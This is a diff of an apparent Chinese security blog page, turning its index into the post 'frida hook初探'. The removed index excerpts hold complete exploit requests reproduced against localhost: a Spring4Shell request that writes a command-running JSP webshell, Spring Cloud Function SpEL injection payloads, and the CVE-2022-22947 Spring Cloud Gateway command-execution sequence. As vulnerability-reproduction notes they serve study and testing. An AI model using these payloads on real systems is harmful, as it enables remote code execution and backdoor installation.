@@ -23,30 +23,43 @@
     var CONFIG = {"hostname":"msfisgood.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="奋力前行">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Y1Shui&#39;s blog">
-<meta property="og:url" content="https://msfisgood.github.io/index.html">
+  <meta name="description" content="前言这段时间趁着项目较少，把APP编写和frida简单hook进行了一些学习，不过毕竟java底子比较薄弱，学习过程还是遇到了一些问题，在此进行一些记录 提前填坑 安卓启动frida前执行setenforce 0关闭SELinux，否则服务端可能起不来  frida脚本运行前要关闭Xposed hook模块，否则会提示非法指令     如果刷了面具的话需要关闭MagiskHide，否则也会报错 使">
+<meta property="og:type" content="article">
+<meta property="og:title" content="frida hook初探">
+<meta property="og:url" content="https://msfisgood.github.io/2022/04/22/frida%20hook/index.html">
 <meta property="og:site_name" content="Y1Shui&#39;s blog">
-<meta property="og:description" content="奋力前行">
+<meta property="og:description" content="前言这段时间趁着项目较少，把APP编写和frida简单hook进行了一些学习，不过毕竟java底子比较薄弱，学习过程还是遇到了一些问题，在此进行一些记录 提前填坑 安卓启动frida前执行setenforce 0关闭SELinux，否则服务端可能起不来  frida脚本运行前要关闭Xposed hook模块，否则会提示非法指令     如果刷了面具的话需要关闭MagiskHide，否则也会报错 使">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2022/04/22/d6jMp9KWqc2CI4k.png">
+<meta property="og:image" content="https://s2.loli.net/2022/04/21/RJnjpFSr3hfqeGa.png">
+<meta property="og:image" content="https://s2.loli.net/2022/04/22/ivOfgEteUPwy8TY.png">
+<meta property="og:image" content="https://s2.loli.net/2022/04/22/VAvxZ19oBKW7OUf.png">
+<meta property="og:image" content="https://s2.loli.net/2022/04/22/c51rFyvajZwUJPI.png">
+<meta property="og:image" content="https://s2.loli.net/2022/04/22/PqGt9KhZMEiVNLd.png">
+<meta property="og:image" content="https://s2.loli.net/2022/04/22/oZWQPgS5J3qwVxG.png">
+<meta property="og:image" content="https://s2.loli.net/2022/04/22/j9E4lcnFwTKOqGe.png">
+<meta property="og:image" content="https://s2.loli.net/2022/04/22/KlXjfPpVHIO5eEg.png">
+<meta property="article:published_time" content="2022-04-22T08:41:52.000Z">
+<meta property="article:modified_time" content="2022-04-22T08:56:59.000Z">
 <meta property="article:author" content="Y1Shui">
+<meta property="article:tag" content="frida">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2022/04/22/d6jMp9KWqc2CI4k.png">
 
-<link rel="canonical" href="https://msfisgood.github.io/">
+<link rel="canonical" href="https://msfisgood.github.io/2022/04/22/frida%20hook/">
 
 
 <script id="page-configurations">
   // https://hexo.io/docs/variables.html
   CONFIG.page = {
     sidebar: "",
-    isHome : true,
-    isPost : false,
+    isHome : false,
+    isPost : true,
     lang   : 'zh-CN'
   };
 </script>
 
-  <title>Y1Shui's blog</title>
+  <title>frida hook初探 | Y1Shui's blog</title>
   
 
 
@@ -187,9 +200,10 @@
         <div class="content-wrap">
           
 
-          <div class="content index posts-expand">
+          <div class="content post posts-expand">
             
-      
+
+    
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
@@ -205,10 +219,9 @@
       <meta itemprop="name" content="Y1Shui's blog">
     </span>
       <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/04/22/frida%20hook/" class="post-title-link" itemprop="url">frida hook初探</a>
-        </h2>
+        <h1 class="post-title" itemprop="name headline">
+          frida hook初探
+        </h1>
 
         <div class="post-meta">
             <span class="post-meta-item">
@@ -255,7 +268,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这段时间趁着项目较少，把APP编写和frida简单hook进行了一些学习，不过毕竟java底子比较薄弱，学习过程还是遇到了一些问题，在此进行一些记录</p>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这段时间趁着项目较少，把APP编写和frida简单hook进行了一些学习，不过毕竟java底子比较薄弱，学习过程还是遇到了一些问题，在此进行一些记录</p>
 <h1 id="提前填坑"><a href="#提前填坑" class="headerlink" title="提前填坑"></a>提前填坑</h1><ul>
 <li><p>安卓启动frida前执行<code>setenforce 0</code>关闭SELinux，否则服务端可能起不来</p>
 </li>
@@ -305,617 +318,58 @@
 <p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/101401252">frida api</a></p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/cyjmosthandsome/article/details/120906998">Frida hook零基础教程</a></p>
 
-      
     </div>
 
     
     
     
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
+        
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://msfisgood.github.io/2022/04/01/Spring4Shell-CVE-2022-22965/">
+<div>
 
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="Y1Shui">
-      <meta itemprop="description" content="奋力前行">
-    </span>
+<div class="wechat_channel">
+  <br>
+  <!-- 这里添加你的二维码图片 -->
+  <img src ="/images/longcode_for_wechat.png">
+  <!-- <span>公众号</span> -->
+</div>
 
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Y1Shui's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/04/01/Spring4Shell-CVE-2022-22965/" class="post-title-link" itemprop="url">Spring4Shell-CVE-2022-22965</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-04-01 00:00:00 / 修改时间：16:26:48" itemprop="dateCreated datePublished" datetime="2022-04-01T00:00:00+08:00">2022-04-01</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" itemprop="url" rel="index"><span itemprop="name">漏洞利用</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-file-word-o"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>1.3k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-clock-o"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>2022年3月30日，CNVD平台接收到蚂蚁科技集团股份有限公司报送的Spring框架远程命令执行漏洞。由于Spring框架存在处理流程缺陷，攻击者可在远程条件下，实现对目标主机的后门文件写入和配置修改，继而通过后门文件访问获得目标主机权限。使用Spring框架或衍生框架构建网站等应用，且同时使用JDK版本在9及以上版本的，易受此漏洞攻击影响。</p>
-<h2 id="影响"><a href="#影响" class="headerlink" title="影响"></a>影响</h2><ul>
-<li>JDK9或以上版本系列</li>
-<li>Spring框架或衍生的SpringBoot等框架，版本小于v5.3.18或v5.2.20</li>
-<li>Spring JavaBean表单参数绑定需要满足一定条件</li>
-<li>部署在Tomcat容器中，且日志记录功能开启</li>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Y1Shui
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://msfisgood.github.io/2022/04/22/frida%20hook/" title="frida hook初探">https://msfisgood.github.io/2022/04/22/frida hook/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
 </ul>
-<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>日志写马</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">suffix: %&gt;//</span><br><span class="line">c1: Runtime</span><br><span class="line">c2: &lt;%</span><br><span class="line">DNT: 1</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+</div>
 
-<p><img src="https://s2.loli.net/2022/04/01/1GxKLvHUhbw2Y5q.png" alt="image-20220401125212182"></p>
-<p>访问webshell</p>
-<p><img src="https://s2.loli.net/2022/04/01/5GWQNfvFjn9diVT.png" alt="image-20220401125417619"></p>
 
-      
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/frida/" rel="tag"><i class="fa fa-tag"></i> frida</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/04/01/Spring4Shell-CVE-2022-22965/" rel="prev" title="Spring4Shell-CVE-2022-22965">
+      <i class="fa fa-chevron-left"></i> Spring4Shell-CVE-2022-22965
+    </a></div>
+      <div class="post-nav-item"></div>
     </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
       </footer>
+    
   </article>
   
   
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://msfisgood.github.io/2022/03/30/Spring-Cloud-Function-SpEL-RCE/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="Y1Shui">
-      <meta itemprop="description" content="奋力前行">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Y1Shui's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/03/30/Spring-Cloud-Function-SpEL-RCE/" class="post-title-link" itemprop="url">Spring-Cloud-Function-SpEL-RCE</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-03-30 22:25:20" itemprop="dateCreated datePublished" datetime="2022-03-30T22:25:20+08:00">2022-03-30</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-04-03 23:27:24" itemprop="dateModified" datetime="2022-04-03T23:27:24+08:00">2022-04-03</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" itemprop="url" rel="index"><span itemprop="name">漏洞利用</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-file-word-o"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>810</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-clock-o"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Spring Cloud Function 是基于Spring Boot 的函数计算框架，它抽象出所有传输细节和基础架构，允许开发人员保留所有熟悉的工具和流程，并专注于业务逻辑。</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>3.0.0.RELEASE &lt;&#x3D; Spring Cloud Function &lt;&#x3D; 3.2.2</p>
-<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST /functionRouter HTTP/1.1</span><br><span class="line">host:127.0.0.1:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15</span><br><span class="line">Connection: close</span><br><span class="line">spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)</span><br><span class="line">Content-Length: 5</span><br><span class="line"></span><br><span class="line">123</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s2.loli.net/2022/04/03/ZkqtToNXg9W8BLD.png" alt="image-20220403232403602"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST /functionRouter HTTP/1.1</span><br><span class="line">host:127.0.0.1:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15</span><br><span class="line">Connection: close</span><br><span class="line">spring.cloud.function.routing-expression:T(java.net.InetAddress).getByName(&quot;81731h.dnslog.cn&quot;)</span><br><span class="line">Content-Length: 3</span><br><span class="line"></span><br><span class="line">123</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s2.loli.net/2022/04/03/m6fvrOawhydJ7tC.png" alt="image-20220403232423476"></p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://github.com/hktalent/spring-spel-0day-poc">https://github.com/hktalent/spring-spel-0day-poc</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://msfisgood.github.io/2022/03/30/Spring%20Cloud%20Gateway%20Actuator%20API%20SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="Y1Shui">
-      <meta itemprop="description" content="奋力前行">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Y1Shui's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/03/30/Spring%20Cloud%20Gateway%20Actuator%20API%20SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="post-title-link" itemprop="url">Spring Cloud Gateway Actuator API SpEL表达式注入命令执行-CVE-2022-22947</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-03-30 20:44:49" itemprop="dateCreated datePublished" datetime="2022-03-30T20:44:49+08:00">2022-03-30</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-04-03 23:22:36" itemprop="dateModified" datetime="2022-04-03T23:22:36+08:00">2022-04-03</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" itemprop="url" rel="index"><span itemprop="name">漏洞利用</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-file-word-o"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>2.8k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-clock-o"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>3 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><hr>
-<p>Spring Cloud Gateway是Spring中的一个API网关。其3.1.0及3.0.6版本（包含）以前存在一处SpEL表达式注入漏洞，当攻击者可以访问Actuator API的情况下，将可以利用该漏洞执行任意命令。</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Spring Cloud Gateway &lt; 3.1.0</p>
-<p>Spring Cloud Gateway &lt; 3.0.7</p>
-<p>Spring Cloud Gateway 其他已不再更新版本</p>
-<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><ol>
-<li>添加包含恶意SpEL表达式的路由：</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/gateway/routes/hacktest HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 329</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;id&quot;: &quot;hacktest&quot;,</span><br><span class="line">  &quot;filters&quot;: [&#123;</span><br><span class="line">    &quot;name&quot;: &quot;AddResponseHeader&quot;,</span><br><span class="line">    &quot;args&quot;: &#123;</span><br><span class="line">      &quot;name&quot;: &quot;Result&quot;,</span><br><span class="line">      &quot;value&quot;: &quot;#&#123;new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;\&quot;id\&quot;&#125;).getInputStream()))&#125;&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;],</span><br><span class="line">  &quot;uri&quot;: &quot;http://example.com&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ol start="2">
-<li>刷新路由</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/gateway/refresh HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<ol start="3">
-<li>访问创建的路由</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /actuator/gateway/routes/hacktest HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: application/x-www-form-urlencoded</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s2.loli.net/2022/04/03/UEJWBiGQaDtMbeT.png" alt="image-20220330205133211"></p>
-<ol start="4">
-<li>删除创建的路由</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">DELETE /actuator/gateway/routes/hacktest HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
-
-<ol start="5">
-<li>再次刷新</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/gateway/refresh HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure>
-
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/spring/CVE-2022-22947/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/spring/CVE-2022-22947/README.zh-cn.md</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://msfisgood.github.io/2022/03/28/sqlmap_tamper/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="Y1Shui">
-      <meta itemprop="description" content="奋力前行">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Y1Shui's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/03/28/sqlmap_tamper/" class="post-title-link" itemprop="url">Sqlmap tamper</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-03-28 00:00:00" itemprop="dateCreated datePublished" datetime="2022-03-28T00:00:00+08:00">2022-03-28</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-04-02 15:42:04" itemprop="dateModified" datetime="2022-04-02T15:42:04+08:00">2022-04-02</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7/" itemprop="url" rel="index"><span itemprop="name">渗透技巧</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-file-word-o"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>802</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-clock-o"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><ul>
-<li>tamper<ul>
